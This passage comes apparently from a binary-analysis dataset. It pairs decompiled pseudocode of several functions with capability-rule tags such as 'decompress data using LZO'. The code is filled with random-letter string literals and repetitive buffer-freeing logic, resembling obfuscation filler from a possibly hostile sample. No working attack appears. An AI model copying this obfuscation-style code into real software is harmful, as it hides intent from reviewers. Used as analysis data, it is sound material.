uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x1a, in_stack_fffffefc & 0xffffff00 | uStack84 & 0xff, \"uxpjckxbruqvfaowlprymboubg\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xe;\n        fcn.00402f72(0x1a, uStack36, \"uxpjckxbruqvfaowlprymboubg\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x00438b58;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00438b64;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x00438b70;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00438b7c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x00438b88;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack160) {\n            iVar2 = iStack180;\n            if ((0xfff < uStack160 + 1) && (iVar2 = *(iStack180 + -4),  0x1f < (iStack180 + -4) - iVar2))\n            goto code_r0x00438b94;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000024) {\n            iVar2 = in_stack_00000010;\n            if ((0xfff < in_stack_00000024 + 1) &&\n               (iVar2 = *(in_stack_00000010 + -4),  0x1f < (in_stack_00000010 + -4) - iVar2)) goto code_r0x00438ba0;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x542580;\n    }\n    in_stack_fffffefc = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_fffffefc < 0x1000) {\ncode_r0x004388b5:\n        fcn.00401a32(uVar1);\n        goto code_r0x004388c1;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_fffffefc = uStack64 + 0x24;\n        goto code_r0x004388b5;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00438b4c:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00438b58:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00438b64:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00438b70:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00438b7c:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00438b88:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00438b94:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x00438ba0:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fVar3 = fcn.00403a76();\n    return fVar3;\n}\n",
        "token_count": 2167
    },
    "00402b49": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nfloat10 fcn.00402b49(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    float10 fVar2;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    int32_t aiStack60 [4];\n    uint uStack44;\n    uint32_t uStack40;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack60;\n    uStack24 = 0x44c150;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    aiStack60[0] = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x53);\n    if (uStack40 < 0x10) {\ncode_r0x00422f59:\n        if (0xf < in_stack_00000018) {\n            iVar1 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar1 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar1))\n            goto code_r0x00422ff8;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar1 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar1 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar1)) goto code_r0x00423004;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return *0x541fd8;\n    }\n    iVar1 = aiStack60[0];\n    if ((uStack40 + 1 < 0x1000) || (iVar1 = *(aiStack60[0] + -4),  (aiStack60[0] + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x00422f59;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00422ff8:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00423004:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fVar2 = fcn.00403a76();\n    return fVar2;\n}\n",
        "token_count": 678
    },
    "00402be4": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402be4(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_00000038;\n    uint32_t in_stack_0000004c;\n    int32_t in_stack_00000050;\n    uint32_t in_stack_00000064;\n    int32_t in_stack_00000068;\n    uint32_t in_stack_0000007c;\n    int32_t aiStack132 [4];\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    int32_t *piStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    piStack32 = aiStack132;\n    uStack24 = 0x414810;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    aiStack132[0] = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x12);\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x48, iStack60, \"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x48, iStack108, \"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x48, uStack36, \"arfrozouoecoytkqzbafxtpqqroylgmujgvsufqofwejgwyqssrqchsukshfirxlsmvokbnb\");\n    if (uStack88 < 0x10) {\ncode_r0x0040c769:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0040c99d;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack64) {\n            iVar1 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar1 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar1))\n            goto code_r0x0040c9a9;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack112) {\n            iVar1 = aiStack132[0];\n            if ((0xfff < uStack112 + 1) && (iVar1 = *(aiStack132[0] + -4),  0x1f < (aiStack132[0] + -4) - iVar1))\n            goto code_r0x0040c9b5;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar1 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar1 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar1))\n            goto code_r0x0040c9c1;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar1 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar1 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar1)) goto code_r0x0040c9cd;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000004c) {\n            iVar1 = in_stack_00000038;\n            if ((0xfff < in_stack_0000004c + 1) &&\n               (iVar1 = *(in_stack_00000038 + -4),  0x1f < (in_stack_00000038 + -4) - iVar1)) goto code_r0x0040c9d9;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000064) {\n            iVar1 = in_stack_00000050;\n            if ((0xfff < in_stack_00000064 + 1) &&\n               (iVar1 = *(in_stack_00000050 + -4),  0x1f < (in_stack_00000050 + -4) - iVar1)) goto code_r0x0040c9e5;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_0000007c) {\n            iVar1 = in_stack_00000068;\n            if ((0xfff < in_stack_0000007c + 1) &&\n               (iVar1 = *(in_stack_00000068 + -4),  0x1f < (in_stack_00000068 + -4) - iVar1)) goto code_r0x0040c9f1;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar1 = *(iStack108 + -4),  (iStack108 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0040c769;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040c99d:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040c9a9:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040c9b5:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040c9c1:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040c9cd:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0040c9d9:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0040c9e5:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0040c9f1:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1830
    },
    "00402d56": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0x00000004 : 0x0042e25b\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint * fcn.00402d56(uint *param_1, uint param_2, int32_t param_3, uint32_t param_4)\n\n{\n    uchar **ppuVar1;\n    uint *puVar2;\n    uint32_t arg_8h;\n    int32_t iVar3;\n    int32_t unaff_ESI;\n    uint32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000020;\n    uint32_t in_stack_00000024;\n    uint32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint32_t in_stack_fffffee4;\n    uint uStack228;\n    uchar uStack224;\n    char *pcStack220;\n    int32_t iStack216;\n    uint uStack200;\n    uint32_t uStack196;\n    int32_t iStack192;\n    uint uStack176;\n    uint32_t uStack172;\n    int32_t iStack168;\n    uint uStack152;\n    uint32_t uStack148;\n    int32_t iStack144;\n    uint uStack128;\n    uint32_t uStack124;\n    uint32_t uStack120;\n    uint uStack104;\n    uint32_t uStack100;\n    uint *puStack96;\n    uchar uStack92;\n    uint *puStack88;\n    uint32_t *puStack84;\n    uint uStack80;\n    uint uStack76;\n    uint *puStack72;\n    uint32_t uStack68;\n    uint *puStack52;\n    uchar **ppuStack32;\n    uint32_t *puStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    ppuStack32 = &ppuStack32;\n    puStack72 = &param_1;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44c4d0;\n    puStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack28;\n    *param_1 = 0;\n    param_1[5] = 0xf;\n    param_1[4] = 2;\n    *param_1 = 0x666c;\n    *(param_1 + 2) = 0;\n    ppuVar1 = &ppuStack32;\n    if (in_stack_00000024 < 0x10) {\ncode_r0x0042dea4:\n        ppuStack32 = ppuVar1;\n        in_stack_00000020 = 0;\n        in_stack_00000024 = 0xf;\n        param_4 = param_4 & 0xffffff00;\n        if (in_stack_00000050 < 0x10) {\ncode_r0x0042deea:\n            *in_FS_OFFSET = puStack28;\n            return param_1;\n        }\n        uStack68 = in_stack_0000003c;\n        if ((in_stack_00000050 + 1 < 0x1000) ||\n           (uStack68 = *(in_stack_0000003c - 4),  (in_stack_0000003c - 4) - uStack68 < 0x20)) {\n            fcn.00401a32(uStack68);\n            goto code_r0x0042deea;\n        }\n    }\n    else {\n        uStack68 = param_4;\n        if ((in_stack_00000024 + 1 < 0x1000) || (uStack68 = *(param_4 - 4),  (param_4 - 4) - uStack68 < 0x20)) {\n            ppuStack32 = &ppuStack32;\n            fcn.00401a32(uStack68);\n            ppuVar1 = ppuStack32;\n            goto code_r0x0042dea4;\n        }\n        uStack20 = 0;\n        fcn.004047f5();\n    }\n    uStack20 = 1;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    puStack88 = &uStack228;\n    uStack80 = 0x44c4e0;\n    puStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &puStack84;\n    puStack96 = puStack52;\n    uStack200 = 0;\n    uStack196 = 0xf;\n    iStack216 = 0;\n    uStack76 = 8;\n    uStack224 = iStack168;\n    pcStack220 = \"lrqxtsgkzpcdzcdzsizd\";\n    uStack228 = 0x14;\n    fcn.00402f72();\n    uStack152 = 0;\n    uStack148 = 0xf;\n    iStack168 = 0;\n    uStack76 = 9;\n    fcn.00402f72(0x22, iStack144, \"afyaceqlwjgumlvxvwmqnrohqfepvciase\");\n    uStack128 = 0;\n    uStack124 = 0xf;\n    iStack144 = 0;\n    uStack76 = 10;\n    fcn.00402f72(0x1c, uStack120, \"iucwaxrkxtgberaspflckfbhdchq\");\n    uStack104 = 0;\n    uStack100 = 0xf;\n    uStack120 = 0;\n    uStack76 = 0xb;\n    fcn.00402f72(0x1c, iStack192, \"iucwaxrkxtgberaspflckfbhdchq\");\n    uStack176 = 0;\n    uStack172 = 0xf;\n    iStack192 = 0;\n    uStack76 = 0xc;\n    fcn.00402f72(0x1c, uStack92, \"iucwaxrkxtgberaspflckfbhdchq\");\n    if (uStack172 < 0x10) {\ncode_r0x0042e113:\n        if (0xf < uStack100) {\n            in_stack_fffffee4 = uStack100 + 1;\n            arg_8h = uStack120;\n            if (0xfff < in_stack_fffffee4) {\n                arg_8h = *(uStack120 - 4);\n                if (0x1f < (uStack120 - 4) - arg_8h) goto code_r0x0042e340;\n                in_stack_fffffee4 = uStack100 + 0x24;\n            }\n            fcn.00401a32(arg_8h);\n        }\n        *puStack96 = 0;\n        puStack96[4] = 0;\n        puStack96[5] = 0xf;\n        *puStack96 = 0;\n        uStack76 = 0xb;\n        fcn.00402f72(0x12, in_stack_fffffee4 & 0xffffff00 | uStack120 & 0xff, \"xtcpkdtzkibqhbooru\");\n        if (0xf < uStack124) {\n            iVar3 = iStack144;\n            if ((0xfff < uStack124 + 1) && (iVar3 = *(iStack144 + -4),  0x1f < (iStack144 + -4) - iVar3))\n            goto code_r0x0042e34c;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack148) {\n            iVar3 = iStack168;\n            if ((0xfff < uStack148 + 1) && (iVar3 = *(iStack168 + -4),  0x1f < (iStack168 + -4) - iVar3))\n            goto code_r0x0042e358;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack196) {\n            iVar3 = iStack216;\n            if ((0xfff < uStack196 + 1) && (iVar3 = *(iStack216 + -4),  0x1f < (iStack216 + -4) - iVar3))\n            goto code_r0x0042e364;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < puStack28) {\n            puVar2 = &param_2;\n            if ((0xfff < puStack28 + 1U) && (puVar2 = param_1,  0x1f < &param_1 - param_1)) goto code_r0x0042e370;\n            fcn.00401a32(puVar2);\n        }\n        ppuStack32 = NULL;\n        puStack28 = 0xf;\n        if (0xf < param_1) {\n            iVar3 = unaff_ESI;\n            if ((0xfff < param_1 + 1U) && (iVar3 = *(unaff_ESI + -4),  0x1f < (unaff_ESI + -4) - iVar3))\n            goto code_r0x0042e37c;\n            fcn.00401a32(iVar3);\n        }\n        param_1 = 0xf;\n        if (0xf < in_stack_00000020) {\n            iVar3 = param_3;\n            if ((0xfff < in_stack_00000020 + 1) && (iVar3 = *(param_3 + -4),  0x1f < (param_3 + -4) - iVar3))\n            goto code_r0x0042e388;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = puStack84;\n        return puStack52;\n    }\n    in_stack_fffffee4 = uStack172 + 1;\n    iVar3 = iStack192;\n    if (in_stack_fffffee4 < 0x1000) {\ncode_r0x0042e107:\n        fcn.00401a32(iVar3);\n        goto code_r0x0042e113;\n    }\n    iVar3 = *(iStack192 + -4);\n    if ((iStack192 + -4) - iVar3 < 0x20) {\n        in_stack_fffffee4 = uStack172 + 0x24;\n        goto code_r0x0042e107;\n    }\n    uStack76 = 0;\n    fcn.004047f5();\ncode_r0x0042e340:\n    uStack76 = 1;\n    fcn.004047f5();\ncode_r0x0042e34c:\n    uStack76 = 2;\n    fcn.004047f5();\ncode_r0x0042e358:\n    uStack76 = 3;\n    fcn.004047f5();\ncode_r0x0042e364:\n    uStack76 = 4;\n    fcn.004047f5();\ncode_r0x0042e370:\n    uStack76 = 5;\n    fcn.004047f5();\ncode_r0x0042e37c:\n    uStack76 = 6;\n    fcn.004047f5();\ncode_r0x0042e388:\n    uStack76 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    puVar2 = fcn.00403a76();\n    return puVar2;\n}\n",
        "token_count": 2608
    },
    "00402dc9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00402dc9(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    int32_t in_stack_0000003c;\n    uint32_t in_stack_00000050;\n    uint auStack192 [2];\n    char *pcStack184;\n    uint uStack180;\n    ushort uStack176;\n    uchar uStack174;\n    uint uStack164;\n    uint uStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44cb20;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 8;\n    pcStack184 = \"askqwodyyycfmnzbpgfvwmfmwcxbicimejixhzgxqmpxeoiygrpuyxmwupnhvarcvetesjlmfuzntwaetv\";\n    auStack192[0] = 0x52;\n    fcn.00402f72();\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x5f, iStack60, \n                 \"iszrkxprwdsngewwnzrgsyvzqywzvyzesxkkdflfusqbkqegmwskxcflkpzqbpnujqtmojeqlsahkznnqyqbkbzvujpvgqc\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x21, uStack180, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    uStack160 = 0xf;\n    uStack164 = 6;\n    uStack180 = 0x7a65746c;\n    uStack176 = 0x7262;\n    uStack174 = 0;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x21, iStack108, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x21, uStack36, \"crfyaqdyyoczncxrqqawhafxwyauamdhr\");\n    if (uStack88 < 0x10) {\ncode_r0x00440a72:\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00440c5b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x00440c67;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack64) {\n            iVar2 = iStack84;\n            if ((0xfff < uStack64 + 1) && (iVar2 = *(iStack84 + -4),  0x1f < (iStack84 + -4) - iVar2))\n            goto code_r0x00440c73;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x00440c7f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x00440c8b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x00440c97;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000050) {\n            iVar2 = in_stack_0000003c;\n            if ((0xfff < in_stack_00000050 + 1) &&\n               (iVar2 = *(in_stack_0000003c + -4),  0x1f < (in_stack_0000003c + -4) - iVar2)) goto code_r0x00440ca3;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x123cb;\n    }\n    iVar2 = iStack108;\n    if ((uStack88 + 1 < 0x1000) || (iVar2 = *(iStack108 + -4),  (iStack108 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00440a72;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x00440c5b:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00440c67:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x00440c73:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x00440c7f:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00440c8b:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x00440c97:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x00440ca3:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1838
    },
    "00402e50": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402e50(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint32_t in_stack_fffffef0;\n    uint32_t in_stack_ffffff08;\n    uint32_t in_stack_ffffff20;\n    uint auStack168 [2];\n    char *pcStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack168;\n    uStack24 = 0x44cd50;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xd;\n    pcStack160 = \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\";\n    auStack168[0] = 0x22;\n    fcn.00402f72();\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x5f, iStack108, \n                 \"objisqribthdsvxqtxgihoqzjbmfgecpedsckzdzdtaymzpsvetamefxyxunvtbnjwkmhxmjtfzvyeajixpzescrqjwwloe\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x11, iStack60, \"jwpjepmvjiaeywspm\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0x10;\n    fcn.00402f72(0x22, uStack84, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x14;\n    fcn.00402f72(0x22, uStack36, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n    if (uStack64 < 0x10) {\ncode_r0x0044719e:\n        if (0xf < uStack40) {\n            in_stack_ffffff20 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff20) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0044761d;\n                in_stack_ffffff20 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x22, in_stack_ffffff20 & 0xffffff00 | uStack84 & 0xff, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x13;\n        fcn.00402f72(0x22, uStack36, \"xzzuajsxifouxiwaiyhfoefszeqjjsostz\");\n        if (0xf < uStack64) {\n            in_stack_ffffff08 = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_ffffff08) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00447629;\n                in_stack_ffffff08 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_ffffff08 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff08) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x00447635;\n                in_stack_ffffff08 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x11, in_stack_ffffff08 & 0xffffff00 | uStack84 & 0xff, \"jwpjepmvjiaeywspm\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x12;\n        fcn.00402f72(0x11, uStack36, \"jwpjepmvjiaeywspm\");\n        if (0xf < uStack64) {\n            in_stack_fffffef0 = uStack64 + 1;\n            uVar1 = uStack84;\n            if (0xfff < in_stack_fffffef0) {\n                uVar1 = *(uStack84 - 4);\n                if (0x1f < (uStack84 - 4) - uVar1) goto code_r0x00447641;\n                in_stack_fffffef0 = uStack64 + 0x24;\n            }\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            in_stack_fffffef0 = uStack40 + 1;\n            iVar2 = iStack60;\n            if 